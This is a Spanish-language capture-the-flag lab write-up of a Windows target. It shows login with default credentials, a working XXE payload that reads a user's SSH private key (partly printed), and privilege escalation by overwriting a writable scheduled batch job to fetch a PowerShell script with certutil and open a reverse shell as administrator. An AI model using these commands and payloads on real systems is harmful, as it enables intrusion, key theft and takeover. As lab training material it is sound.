// 01

Login y XXE

1
LOGIN CON CREDENCIALES POR DEFECTO
CURL
$ curl -s -c -b /tmp/mk_c.txt -L -d 'username=admin&password=password' http://10.129.95.192/
302 → /home.php
menú: products.php · contact.php · services.php · about.php
2
LOCALIZAR EL ENVÍO DE XML

services.php construye un XML en JavaScript y lo envía por XMLHttpRequest a process.php con Content-Type: text/xml — el backend lo parsea del lado servidor.

3
CONFIRMAR Y EXPLOTAR EL XXE
XXE
$ curl -s -b /tmp/mk_c.txt -X POST -H 'Content-Type: text/xml' \
--data-binary @/tmp/xxe.xml http://10.129.95.192/process.php
Item: -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB...
-----END OPENSSH PRIVATE KEY-----

// XXE — XML EXTERNAL ENTITY

Dónde: el parser XML de process.php resuelve entidades externas declaradas en un DOCTYPE.
Qué permite: leer cualquier archivo accesible por el proceso de Apache — en este caso, la clave privada SSH del usuario daniel.

// OJO CON EL CONTENT-TYPE

El mismo payload con Content-Type: application/xml no expande la entidad y devuelve la respuesta vacía. El valor correcto es text/xml: es el que usa el JavaScript original de la página, y el parser del servidor solo procesa entidades para ese tipo.

// 02

Clave SSH de daniel

4
LIMPIAR LA CLAVE Y ENTRAR POR SSH

La respuesta HTTP envuelve la clave en el HTML de la página; hay que recortar exactamente entre las cabeceras BEGIN/END antes de usarla.

SSH
$ chmod 600 /tmp/daniel_id_rsa
$ ssh -i /tmp/daniel_id_rsa daniel@10.129.95.192

// 03

Tarea programada

5
ENCONTRAR EL SCRIPT Y SU PERMISO
CMD
markup\daniel> type C:\Log-Management\job.bat
markup\daniel> icacls C:\Log-Management\job.bat
@echo off
REM limpia los logs de eventos periódicamente
BUILTIN\Users:(F)

// TAREA PROGRAMADA ESCRIBIBLE

Dónde: job.bat, ejecutado periódicamente por una tarea programada como Administrador.
Qué permite: el ACL BUILTIN\Users:(F) (control total) deja que cualquier usuario reescriba el script que correrá con privilegios de administrador en la siguiente ejecución.

6
REEMPLAZAR JOB.BAT Y RECIBIR LA SHELL

El nuevo contenido descarga un .ps1 con certutil y lo ejecuta. Para escribirlo sin pelear con las comillas de cmd, se envía como powershell -EncodedCommand (el script en UTF-16LE + base64) por el propio SSH.

ENCODEDCOMMAND
# mk_writer.ps1: Set-Content job.bat con certutil -urlcache + powershell -File rs.ps1
$ B64=$(iconv -f UTF-8 -t UTF-16LE /tmp/mk_writer.ps1 | base64 -w0)
$ ssh -i /tmp/daniel_id_rsa daniel@10.129.95.192 "powershell -nop -EncodedCommand $B64"
[+] conexión desde 10.129.95.192:49693
markup\administrator
[flag oculta]

// FLAGS

user: [flag oculta] · root: [flag oculta]. Ruta completa: admin:password → XXE en process.php (id_rsa de daniel) → SSH → job.bat escribible → certutil + ps1 → Administrator. Tiempo total: ~50 minutos (la mayor parte, escribir el fichero correctamente en Windows).

// 04

Referencia Comandos

XXE payload
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///ruta">]>...&xxe;
Declara una entidad externa que el parser resuelve leyendo un archivo local del servidor.
icacls
icacls archivo
Muestra los permisos NTFS de un archivo en Windows; clave para detectar ACL demasiado permisivas como Users:(F).
certutil -urlcache
certutil -urlcache -split -f <URL> destino
Herramienta nativa de Windows reutilizada para descargar archivos por HTTP sin instalar nada extra.
powershell -EncodedCommand
powershell -EncodedCommand <base64 de UTF-16LE>
Ejecuta un script de PowerShell codificado, evitando por completo los problemas de comillas y metacaracteres al enviarlo por otro canal (como SSH).

// 05

Glosario

XXE — XML External Entity
Vulnerabilidad de parsers XML que resuelven entidades externas declaradas por el usuario, permitiendo leer archivos locales o, en algunos casos, hacer peticiones desde el servidor (SSRF).
Credenciales por defecto
Usuario y contraseña de fábrica que nunca se cambiaron tras el despliegue. Sigue siendo una de las causas más comunes de compromiso inicial.
Tarea programada (Scheduled Task)
Mecanismo de Windows para ejecutar un script periódicamente. Si corre con privilegios altos y el script es escribible por un usuario normal, equivale a una escalada directa.
ACL / icacls
Lista de control de acceso que define quién puede leer, escribir o ejecutar un archivo en NTFS. (F) significa control total (Full control).
certutil
Utilidad legítima de Windows para gestionar certificados, reutilizada habitualmente para descargar archivos (-urlcache) cuando no hay otras herramientas disponibles.
